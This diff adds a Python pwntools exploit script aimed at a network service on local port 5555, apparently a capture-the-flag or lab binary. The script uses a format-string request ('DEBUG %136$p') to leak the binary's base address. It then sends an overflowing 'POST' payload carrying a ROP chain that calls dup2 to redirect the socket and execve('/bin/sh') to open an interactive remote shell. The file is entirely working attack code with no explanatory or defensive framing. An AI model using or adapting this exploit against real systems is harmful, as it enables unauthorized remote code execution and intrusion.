@@ -1,0 +1,77 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+
+remote_addr = "127.0.0.1"
+
+# Connect to the target service and leak the binary base address
+r1 = remote(remote_addr, 5555)
+payload = b"DEBUG %136$p \n"
+r1.sendline(payload)
+resp = r1.recv().strip()
+resp = int(resp, 16)
+binary_base = resp - 0x1780
+r1.close()
+
+# Gadget List (Offsets to useful instructions for ROP chain)
+# 0x000000000000180b : pop rax ; ret
+# 0x0000000000001816 : pop rdi ; xor rdi, rbp ; ret
+# 0x0000000000001811 : pop rsi ; ret
+# 0x000000000000180d : pop rdx ; pop r12 ; ret
+# 0x0000000000001807 : push rbp ; mov rbp, rsp ; pop rax ; ret
+# 0x0000000000001813 : syscall
+
+# Calculate gadget addresses based on the leaked binary base
+pop_rax = binary_base + 0x180b
+pop_rdi_xor_rdi_rbp = binary_base + 0x1816
+pop_rsi = binary_base + 0x1811
+pop_rdx_pop_r12 = binary_base + 0x180d
+push_rbp_mov_rbp_rsp_pop_rax = binary_base + 0x1807
+syscall = binary_base + 0x1813
+execve = 59
+dup2 = 33 
+
+# Build the start of the payload
+payload = b"POST "
+payload += b"A" * 16       # Offset to the rbp
+payload += b"/bin/sh\x00"  # Overwrite rbp with /bin/sh string
+
+# dup2(4, 0) - Redirect file descriptor 4 to stdin (fd 0)
+payload += p64(pop_rdi_xor_rdi_rbp) # Set rdi as 4
+payload += b"+bin/sh\x00"
+payload += p64(pop_rax)             # Set rax to 33 (dup2 syscall number)
+payload += p64(dup2)
+payload += p64(pop_rsi)             # Set rsi to 0 (stdin)
+payload += p64(0)
+payload += p64(syscall)             # Trigger the syscall
+
+# dup2(4, 1) - Redirect file descriptor 4 to stdout (fd 1)
+payload += p64(pop_rdi_xor_rdi_rbp) # Set rdi as 4
+payload += b"+bin/sh\x00"  
+payload += p64(pop_rax)             # Set rax to 33 (dup2 syscall number)
+payload += p64(dup2)
+payload += p64(pop_rsi)             # Set rsi to 1 (stdout)
+payload += p64(1)
+payload += p64(syscall)             # Trigger the syscall
+
+# execve("/bin/sh\0", 0, 0) - Execute the shell
+payload += p64(push_rbp_mov_rbp_rsp_pop_rax) # Set the value of rbp with the address of /bin/sh
+payload += p64(pop_rdi_xor_rdi_rbp)          # Move the address in rbp to rdi (first argument to execve)
+payload += p64(0)                            # Set rdi to 0 for xor with rbp
+payload += p64(pop_rax)                      # Set rax to 59 (sys_execve syscall number)
+payload += p64(execve)  
+payload += p64(pop_rsi)                      # Set rsi to 0 (second argument to execve)
+payload += p64(0)
+payload += p64(pop_rdx_pop_r12)              # Set rdx to 0 (third argument to execve, also sets r12 to 0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(syscall)                      # Trigger the syscall
+
+payload += b" \n"
+
+r2 = remote(remote_addr, 5555)
+r2.sendline(payload)
+r2.sendline(b"")
+r2.interactive("$ ")
